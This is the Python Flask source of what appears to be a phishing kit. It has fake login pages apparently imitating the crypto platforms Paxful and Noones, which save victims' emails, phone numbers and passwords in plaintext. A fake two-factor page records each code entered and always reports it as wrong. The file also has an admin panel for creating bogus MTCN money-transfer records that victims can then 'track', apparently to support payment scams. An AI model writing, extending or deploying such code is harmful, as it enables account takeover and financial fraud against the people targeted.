from flask import Flask, render_template, request, redirect, url_for, session
import sqlite3
import os

app = Flask(__name__)
app.secret_key = "supersecretkey"  # Needed for session support

# ---------- Database Setup ----------
DB_NAME = "site.db"

def init_db():
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS paxlogin (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email_or_phone TEXT NOT NULL,
            password TEXT NOT NULL
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS nooneslogin (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email_or_phone TEXT NOT NULL,
            password TEXT NOT NULL
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS pax2fa (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email TEXT NOT NULL,
            code TEXT NOT NULL
        )
    ''')
    conn.commit()
    conn.close()

# Call this once at startup
init_db()

# ---------- Routes ----------
@app.route("/")
def home():
    return render_template("home.html")


@app.route("/paxlogin", methods=["GET", "POST"])
def paxlogin():
    if request.method == "POST":
        email_or_phone = request.form.get("email_or_phone")
        password = request.form.get("password")

        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        cursor.execute("INSERT INTO paxlogin (email_or_phone, password) VALUES (?, ?)", 
                       (email_or_phone, password))
        conn.commit()
        conn.close()

        # Store email in session
        session["user_email"] = email_or_phone

        return redirect(url_for("pax2fa"))
    return render_template("paxlogin.html")


@app.route("/nooneslogin", methods=["GET", "POST"])
def nooneslogin():
    if request.method == "POST":
        email_or_phone = request.form.get("email_or_phone")
        password = request.form.get("password")

        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        cursor.execute("INSERT INTO nooneslogin (email_or_phone, password) VALUES (?, ?)", 
                       (email_or_phone, password))
        conn.commit()
        conn.close()

        return redirect(url_for("home"))
    return render_template("nooneslogin.html")



@app.route("/pax2fa", methods=["GET", "POST"])
def pax2fa():
    email = session.get("user_email")
    error = None

    if request.method == "POST":
        code = request.form.get("otp_code", "")

        if code == "1234H6":  # Example correct code
            return redirect(url_for("home"))
        else:
            conn = sqlite3.connect(DB_NAME)
            cursor = conn.cursor()
            cursor.execute(
                "INSERT INTO pax2fa (email, code) VALUES (?, ?)", 
                (email, code)
            )
            conn.commit()
            conn.close()
            error = "Incorrect code. Please try again."

    return render_template("pax2fa.html", email=email, error=error)


def init_mtcn_db():
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS transactions (
            tracking_number TEXT PRIMARY KEY,
            payment_currency TEXT,
            payment_method TEXT,
            amount REAL,
            status TEXT,
            customer_name TEXT,
            customer_account TEXT,
            transaction_id TEXT,
            is_fraudulent INTEGER,
            transaction_notes TEXT
        )
    ''')
    conn.commit()
    conn.close()

# call it at startup
init_mtcn_db()


@app.route("/admin", methods=["GET"])
def admin_form():
    return render_template("c_mtcn.html")   # admin enters new MTCN


@app.route("/add_transaction", methods=["POST"])
def add_transaction():
    data = request.form
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    try:
        cursor.execute("""INSERT INTO transactions VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""", (
            data.get("tracking_number"),
            data.get("payment_currency"),
            data.get("payment_method"),
            data.get("amount"),
            data.get("status"),
            data.get("customer_name"),
            data.get("customer_account"),
            data.get("transaction_id"),
            1 if data.get("is_fraudulent") else 0,
            data.get("transaction_notes")
        ))
        conn.commit()
    except sqlite3.IntegrityError:
        conn.close()
        return "⚠️ Tracking number already exists!", 400
    conn.close()
    return redirect(url_for("admin_form"))


@app.route("/track", methods=["GET"])
def track_form():
    return render_template("mtcn.html")    # client enters MTCN


@app.route("/verify", methods=["POST"])
def verify():
    data = request.get_json()
    tracking_number = data.get("tracking_number")

    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("SELECT tracking_number, status, amount, customer_name FROM transactions WHERE tracking_number = ?", (tracking_number,))
    row = cursor.fetchone()
    conn.close()

    if row:
        return {
            "tracking_number": row[0],
            "status": row[1],
            "amount": row[2],
            "customer_name": row[3]
        }, 200
    else:
        return {"error": "Tracking number not found"}, 404


@app.route("/c_mtcn", methods=["GET", "POST"])
def c_mtcn():
    if request.method == "POST":
        tracking_number = request.form.get("tracking_number")
        payment_currency = request.form.get("payment_currency")
        payment_method = request.form.get("payment_method")
        amount = request.form.get("amount")
        status = request.form.get("status")
        customer_name = request.form.get("customer_name")
        customer_account = request.form.get("customer_account")
        transaction_id = request.form.get("transaction_id")
        is_fraudulent = 1 if request.form.get("is_fraudulent") else 0
        transaction_notes = request.form.get("transaction_notes")

        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        cursor.execute("""
            INSERT OR REPLACE INTO mtcn (
                tracking_number, payment_currency, payment_method, amount, status,
                customer_name, customer_account, transaction_id, is_fraudulent, transaction_notes
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (
            tracking_number, payment_currency, payment_method, amount, status,
            customer_name, customer_account, transaction_id, is_fraudulent, transaction_notes
        ))
        conn.commit()
        conn.close()

        return redirect(url_for("track_form"))  # After saving, redirect to client tracking page

    return render_template("c_mtcn.html")


# ---------- Run ----------
if __name__ == "__main__":
    app.run(debug=True)
